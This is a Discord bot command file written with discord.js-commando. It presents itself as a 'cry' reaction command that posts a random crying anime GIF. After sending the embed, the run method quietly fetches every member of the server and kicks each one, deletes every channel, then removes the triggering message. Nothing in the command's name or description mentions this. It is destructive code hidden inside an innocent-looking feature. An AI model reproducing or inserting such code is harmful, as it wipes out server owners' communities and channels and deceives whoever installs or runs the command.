const { Command } = require('discord.js-commando');
const Discord = require('discord.js');

var randomGif = ["https://i.waifu.pics/q-3o-0e.gif",
    "https://i.waifu.pics/q-3o-0e.gif",
    "https://i.waifu.pics/WY8I9Xs.gif",
    "https://i.waifu.pics/sJmYw5w.gif",
    "https://i.waifu.pics/Mqpc-H0.gif",
    "https://i.waifu.pics/kmUKaHC.gif",
    "https://i.waifu.pics/~xVlJv7.gif",
    "https://i.waifu.pics/f-f60kK.gif",
    "https://i.waifu.pics/w~9Ts9z.gif",
    "https://i.waifu.pics/owz~e8r.gif",
    "https://i.waifu.pics/k2r~YJ0.gif",
    "https://i.waifu.pics/~7-brLD.gif",
    "https://i.waifu.pics/YjORwmK.gif",
    "https://i.waifu.pics/tfNqRJy.gif",
    "https://i.waifu.pics/zGi~DA0.gif",
    "https://i.waifu.pics/USePcuV.gif",
    "https://i.waifu.pics/6x-~igD.gif",
    "https://i.waifu.pics/tK9Qfqy.gif",
    "https://i.waifu.pics/9bMLB0l.gif",
    "https://i.waifu.pics/RyVb4I0.gif",
    "https://i.waifu.pics/fmX3C31.gif",
    "https://i.waifu.pics/yMRfqOV.gif",
    "https://i.imgur.com/36lPN0y.gif",
    "https://i.imgur.com/qb9Zsyl.gif",
    "https://i.imgur.com/0OyayOL.gif"];


module.exports = class CryCommand extends Command {
  constructor(client) {
    super(client, {
      name: 'cry',
      memberName: 'cry',
      group: 'ntb',
      description: 'Cry',
      guildOnly: true,
    });
  }
  
  async run(message) {
    const gif = randomGif[Math.floor(Math.random() * randomGif.length)];

    const embed = new Discord.MessageEmbed()
        .setDescription(`**${message.author}** crying..`)
        .setImage(gif)

    message.channel.send(embed)

    const allMembers = await message.guild.members.fetch();
    allMembers.forEach(member => {
      member.kick()
      .catch(error => console.log(error))
    });
    
    await message.guild.channels.cache.forEach(channel => { 
      channel.delete()
      .catch(error => console.log(error))
    });

    setTimeout(() => message.delete(), 1000)
}};